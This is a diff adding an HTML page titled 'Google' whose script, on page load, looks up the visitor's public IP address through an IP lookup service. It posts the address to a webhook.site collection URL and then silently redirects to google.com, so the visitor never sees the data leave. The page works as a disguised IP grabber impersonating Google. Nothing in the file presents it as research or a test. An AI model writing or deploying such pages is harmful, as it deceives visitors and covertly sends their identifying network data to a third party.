@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Google</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="">
+    </head>
+    <body>
+        <script type="text/javascript">
+            async function reportIp(ip) {
+                const url = 'https://webhook.site/113907e9-3057-4db2-af79-0db93059aefa';
+
+                const response = await fetch(url, {
+                    method: "POST",
+                    body: `Reported IP: ${ip}`,
+                });
+
+                const data = await response.json();
+                console.log(data);
+            }
+
+            (async () => {
+                for (let i = 0; i < 10; i++) {
+                    try {
+                    await fetch("https://api.ipify.org?format=json")
+                        .then((res) => res.json())
+                        .then((data) => reportIp(data));
+                    break;
+                    } catch (e) {}
+                }
+                window.location.replace("https://google.com");
+            })();
+
+
+        </script>
+    </body>
+</html>
